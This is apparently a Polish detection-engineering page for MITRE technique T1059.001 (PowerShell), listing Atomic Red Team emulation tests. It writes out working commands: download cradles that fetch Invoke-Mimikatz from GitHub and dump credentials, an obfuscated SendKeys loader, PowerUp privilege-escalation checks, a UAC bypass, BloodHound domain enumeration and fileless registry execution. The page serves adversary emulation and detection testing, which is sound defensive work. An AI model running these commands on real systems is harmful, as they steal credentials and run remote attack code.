# Alert: PowerShell

Opis scenariusza, podatności lub techniki.

---

**Technika:** T1059.001  
**Nazwa:** PowerShell  
**Taktyki:** Execution  
**Status:** Pending  
**Autor:** Krzysztof K.  

---

<!--
Tactics: Execution
Technique ID: T1059.001
Technique Name: PowerShell
Status: Pending
--> 


---

## Atomic Red Team – dostępne testy dla tej techniki

### Mimikatz
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1059.001\Mimikatz/test_1.cmd)

### Run BloodHound from local disk
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
import-module "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
try { Invoke-BloodHound -OutputDirectory $env:Temp }
catch { $_; exit $_.Exception.HResult}
Start-Sleep 5
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\Run_BloodHound_from_local_disk/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Remove-Item $env:Temp\*BloodHound.zip -Force
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1059.001\Run_BloodHound_from_local_disk/cleanup_1.ps1)

### Run Bloodhound from Memory using Download Cradle
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\Run_Bloodhound_from_Memory_using_Downloa/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Remove-Item $env:Temp\*BloodHound.zip -Force
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1059.001\Run_Bloodhound_from_Memory_using_Downloa/cleanup_1.ps1)

### Mimikatz - Cradlecraft PsSendKeys
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\Mimikatz_-_Cradlecraft_PsSendKeys/test_1.ps1)

### Invoke-AppPathBypass
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1059.001\Invoke-AppPathBypass/test_1.cmd)

### Powershell MsXml COM object - with prompt
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1059.001\Powershell_MsXml_COM_object_-_with_promp/test_1.cmd)

### Powershell XML requests
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1059.001\Powershell_XML_requests/test_1.cmd)

### Powershell invoke mshta.exe download
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1059.001\Powershell_invoke_mshta.exe_download/test_1.cmd)

### Powershell Invoke-DownloadCradle
**Opis:** 

### PowerShell Fileless Script Execution
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\PowerShell_Fileless_Script_Execution/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1059.001\PowerShell_Fileless_Script_Execution/cleanup_1.ps1)

### NTFS Alternate Data Stream Access
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
Invoke-Expression $streamcommand
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\NTFS_Alternate_Data_Stream_Access/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Remove-Item #{ads_file} -Force -ErrorAction Ignore
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1059.001\NTFS_Alternate_Data_Stream_Access/cleanup_1.ps1)

### PowerShell Session Creation and Use
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
New-PSSession -ComputerName #{hostname_to_connect}
Test-Connection $env:COMPUTERNAME
Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\PowerShell_Session_Creation_and_Use/test_1.ps1)

### ATHPowerShellCommandLineParameter -Command parameter variations
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Comma/test_1.ps1)

### ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Comma/test_1.ps1)

### ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Encod/test_1.ps1)

### ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Encod/test_1.ps1)

### PowerShell Command Execution
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
powershell.exe -e  #{obfuscated_code}
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1059.001\PowerShell_Command_Execution/test_1.cmd)

### PowerShell Invoke Known Malicious Cmdlets
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
$malcmdlets = #{Malicious_cmdlets}
foreach ($cmdlets in $malcmdlets) {
    "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
foreach ($cmdlets in $malcmdlets) {
    $cmdlets}
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\PowerShell_Invoke_Known_Malicious_Cmdlet/test_1.ps1)

### PowerUp Invoke-AllChecks
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
Invoke-AllChecks
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\PowerUp_Invoke-AllChecks/test_1.ps1)

### Abuse Nslookup with DNS Records
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
# creating a custom nslookup function that will indeed call nslookup but forces the result to be "whoami"
# this would not be part of a real attack but helpful for this simulation
function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\Abuse_Nslookup_with_DNS_Records/test_1.ps1)

### SOAPHound - Dump BloodHound Data
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\SOAPHound_-_Dump_BloodHound_Data/test_1.ps1)

### SOAPHound - Build Cache
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1059.001\SOAPHound_-_Build_Cache/test_1.ps1)

[Zobacz testy na GitHubie](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1059.001)
